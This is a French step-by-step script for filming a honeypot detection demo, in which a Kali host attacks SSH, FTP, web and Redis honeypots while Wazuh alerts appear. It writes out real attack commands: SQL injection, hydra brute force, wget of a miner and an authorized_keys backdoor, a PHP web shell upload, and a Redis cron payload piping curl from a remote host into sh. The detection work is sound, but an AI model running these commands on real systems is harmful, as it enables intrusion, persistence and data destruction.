# Scénario de démonstration vidéo

Ce document est le **script pas-à-pas de la vidéo** : l'ordinateur portable Kali
(hôte, `192.168.56.1`) attaque les honeypots de **NIX01** (`192.168.56.101`) et
les alertes apparaissent en direct dans la console **SRV01** et sur le dashboard
Wazuh ouvert dans Firefox.

Toutes les commandes et toutes les alertes ci-dessous ont été **vérifiées sur le
lab réel** : chaque attaque est lancée depuis l'hôte Kali et l'alerte arrive dans
`/var/ossec/logs/alerts/alerts.json` sur SRV01 avec `srcip 192.168.56.1`.

> Astuce prises multiples : `bash scripts/demo_reset.sh` vide les journaux des
> honeypots et les alertes avant une nouvelle prise.

---

## 0. Préparation (avant d'enregistrer)

```bash
# Sur l'hôte Kali, à la racine du dépôt
vagrant status                      # srv01 running, nix01 running
# Outils d'attaque déjà installés : nmap, nikto, sqlmap, hydra, redis-tools,
# ftp, sshpass, python3-paramiko
bash scripts/demo_reset.sh          # (optionnel) repartir de journaux propres
```

Fenêtres à préparer à l'écran :
1. **VirtualBox** avec les consoles **SRV01** et **NIX01** visibles.
2. Un **terminal sur l'hôte Kali** (c'est de là que partent les attaques).
3. **Firefox** sur le dashboard Wazuh.

---

## 1. Montrer l'infrastructure (VirtualBox)

- Ouvrir **VirtualBox**, montrer les deux VM **SRV01** (Wazuh) et **NIX01** (honeypots).
- Ouvrir la console de chacune (double-clic) et se connecter : **login `vagrant` / mot de passe `vagrant`**.

### Sur NIX01 — montrer que les honeypots tournent

```bash
systemctl is-active honeypot honeypot-ssh honeypot-ftp honeypot-redis
# -> active / active / active / active
sudo ss -ltnp | grep -E ':(5000|2222|21|6379) '   # web, SSH, FTP, Redis à l'écoute
```

### Sur SRV01 — lancer le tail -f des alertes en direct

Laisser cette commande tourner, visible pendant toute la démo :

```bash
sudo tail -f /var/ossec/logs/alerts/alerts.json \
  | python3 -c 'import sys,json
for l in sys.stdin:
    try: a=json.loads(l)
    except: continue
    r=a["rule"]; d=a.get("data",{})
    print(f'"'"'[{d.get("honeypot","web"):5}] rule {r["id"]:>6} niv {r["level"]:>2}  {d.get("srcip","-"):15} {r["description"][:70]}'"'"')'
```

> Alternative plus lisible : `sudo python3 /vagrant/tools/show_alerts.py --since 1`
> (résumé par honeypot, à relancer après chaque attaque).

---

## 2. Ouvrir le dashboard Wazuh (Firefox)

- **URL** : `https://192.168.56.102/app/dashboards#/view/hp-dashboard`
  (ou `https://192.168.56.102` → menu ☰ → *Dashboards* → **Honeypot**).
- Accepter l'avertissement de certificat auto-signé.
- **Identifiants** : `admin` / *(mot de passe dans `.secrets/wazuh-admin.txt`)*.
- En haut à droite, régler la **plage de temps** : **Last 15 minutes**.
- Activer le **rafraîchissement automatique** : cliquer sur la flèche à côté de la
  plage de temps → **Refresh every 5 seconds** → *Start*.

Le tableau de bord « Honeypot » montre : alertes par honeypot, timeline, top IP /
utilisateurs / mots de passe / commandes, règles déclenchées, techniques MITRE,
fichiers déposés.

---

## 3. Les attaques (depuis le terminal Kali)

Pour chaque commande, l'alerte attendue apparaît dans le `tail -f` de SRV01 (avec
`srcip 192.168.56.1`) puis sur le dashboard. `niv` = niveau Wazuh.

### 3.1 Reconnaissance — nmap

```bash
nmap -sV -p 21,2222,5000,6379 192.168.56.101
```
nmap identifie des services crédibles : *vsftpd 3.0.5*, *OpenSSH 8.9p1*,
*Gunicorn*, *Redis 5.0.7*.

| Alerte | Règle | Niv | MITRE |
|---|---|---|---|
| Nouvelle connexion honeypot (ssh/ftp/redis) | **100401** | 3 | T1046 |
| Commande Redis (`INFO`) | 100420 | 3 | — |
| User-agent d'outil/scanner (sonde web nmap) | **100112** | 12 | T1595 |
| Tentative SQLi (sondes web nmap) | 100110 | 12 | T1190 |

### 3.2 Attaques web — nikto, sqlmap, injection SQL manuelle

```bash
nikto -h http://192.168.56.101:5000 -maxtime 30s
sqlmap -u "http://192.168.56.101:5000/login" --data "username=a&password=b" --batch --level 1
# Contournement d'authentification manuel (SQLi dans le login) :
curl -X POST --data "username=admin' -- &password=x" http://192.168.56.101:5000/login
```

| Alerte | Règle | Niv | MITRE |
|---|---|---|---|
| Contournement d'auth / SQLi login (`admin' --`) | **100111** | 12 | T1078 |
| Injection SQL | **100110** | 12 | T1190 |
| User-agent scanner (nikto/sqlmap) | **100112** | 12 | T1595 |
| Charge XSS / injection HTML | 100120 | 10 | T1059.007 |
| Altération de méthode HTTP (`DELETE /admin`) | 100130 | 12 | T1190 |
| Injection de commande | 100150 | 12 | T1059 |
| Sonde de chemin sensible (`.env`, `.git`…) | 100140 | 6 | T1595 |
| Brute force de répertoires (beaucoup de 404) | **100191** | 8 | T1595 |

### 3.3 SSH — brute force (hydra) puis connexion et commandes

```bash
# Liste avec 6+ mauvais mots de passe + le bon (123456)
printf 'qwerty\nletmein\n12345\nabc123\nchangeme\nhunter2\ndragon\n123456\n' > /tmp/pw.txt
hydra -l root -P /tmp/pw.txt -s 2222 -t 4 ssh://192.168.56.101
# -> trouve root:123456

# Connexion de l'attaquant + commandes (sshpass automatise la saisie du mot de passe)
printf 'whoami\nuname -a\nwget http://198.51.100.7/miner.sh -O /tmp/miner.sh\nchmod +x /tmp/miner.sh\necho ssh-rsa AAAAB3...attacker@kali >> ~/.ssh/authorized_keys\nhistory -c\nexit\n' \
  | sshpass -p 123456 ssh -tt -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@192.168.56.101
```

| Alerte | Règle | Niv | MITRE |
|---|---|---|---|
| Nouvelle connexion | 100401 | 3 | T1046 |
| Échec d'authentification `root` (x6) | **100402** | 5 | T1110 |
| **Brute force (6+ échecs, même IP)** | **100410** | 10 | T1110.001 |
| Connexion réussie (identifiants faibles) | **100404** | 10 | T1078 |
| Commande de reconnaissance (`whoami`, `uname -a`) | 100423 | 5 | T1082 |
| Téléchargement de malware (`wget …miner.sh`) | **100421** | 10 | T1105 |
| Commande dangereuse (`chmod +x`, `authorized_keys`, `history -c`) | **100422** | 12 | T1059.004 |

> Note technique : le honeypot SSH accepte volontairement les clients **libssh**
> (hydra, medusa, ncrack, metasploit) en plus d'OpenSSH.

### 3.4 FTP — connexion et dépôt d'un web shell

```bash
# Vol d'un fichier de config, puis dépôt d'un web shell PHP
curl -u admin:admin "ftp://192.168.56.101/backup/config.php.bak"
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /tmp/shell.php
curl -T /tmp/shell.php -u admin:admin "ftp://192.168.56.101/shell.php"
```

| Alerte | Règle | Niv | MITRE |
|---|---|---|---|
| Nouvelle connexion | 100401 | 3 | T1046 |
| Connexion réussie `admin` (identifiants faibles) | **100404** | 10 | T1078 |
| Téléchargement de fichier (`config.php.bak`) | 100432 | 6 | T1005 |
| **Web shell / script déposé (`shell.php`)** | **100431** | 12 | T1105, T1505.003 |

### 3.5 Redis — écriture de fichier (cron) et maître pirate

```bash
# Toutes les commandes dans UNE SEULE session (pour la corrélation 100446)
printf 'CONFIG SET dir /var/spool/cron/crontabs\nCONFIG SET dbfilename root\nSET x "\\n*/1 * * * * curl -fsSL http://198.51.100.7/x.sh | sh\\n"\nSAVE\nSLAVEOF 198.51.100.7 6379\nMODULE LOAD /tmp/exp.so\nFLUSHALL\n' \
  | redis-cli -h 192.168.56.101
```

| Alerte | Règle | Niv | MITRE |
|---|---|---|---|
| Nouvelle connexion | 100401 | 3 | T1046 |
| `CONFIG SET dir/dbfilename` (écriture de fichier) | **100440** | 12 | T1190, T1053.003 |
| **`CONFIG SET` + `SAVE` (attaque d'écriture aboutie)** | **100446** | **14** | T1053.003, T1098.004 |
| `SLAVEOF` vers un maître pirate | **100441** | 12 | T1105 |
| `MODULE LOAD` (RCE via module) | **100442** | 13 | T1129 |
| `FLUSHALL` (destruction de données) | 100444 | 8 | T1485 |

### 3.6 (Option) Rejouer tout le scénario d'un coup

```bash
python3 tools/attack_demo.py --slow        # web + SSH + FTP + Redis, avec pauses
```

---

## 4. Élévation de privilèges (si on filme aussi NIX01 en local)

Sur **NIX01**, auditd détecte les actions de privesc d'un utilisateur non privilégié ;
les alertes partent vers SRV01. Pour en déclencher pour la démo :

```bash
sudo bash /vagrant/tests/test_nix01.sh --trigger
```

| Action | Règle | Niv | MITRE |
|---|---|---|---|
| `find` (énumération SUID) | 100218 | 8 | T1083 |
| `sudo` / commande privilégiée | 100214 | 10 | T1548 |
| Modification de `cron` | 100212 | 10 | T1053.003 |
| Fichiers de l'appli honeypot modifiés (FIM) | 100300 | 7 | T1565 |

---

## 5. Conclusion (dans le dashboard)

Revenir à **Firefox** sur le dashboard « Honeypot » :

- **Timeline** : le pic d'alertes correspondant à la démo.
- **Top IP source** : `192.168.56.1` (l'hôte Kali) en tête.
- **Top utilisateurs / mots de passe** : `root`, `admin`, `123456`…
- **Top commandes** : les commandes SSH/Redis de l'attaquant.
- **Règles & MITRE ATT&CK** : panorama des techniques (T1110, T1078, T1105,
  T1190, T1053.003, T1485, T1129…).
- **Fichiers déposés** : le web shell `shell.php` déposé par FTP (sha256).

Message de fin : *un seul poste d'attaque, quatre honeypots, et toute la chaîne
d'attaque — reconnaissance, accès initial, exécution, persistance, impact —
corrélée et visualisée en temps réel par Wazuh.*
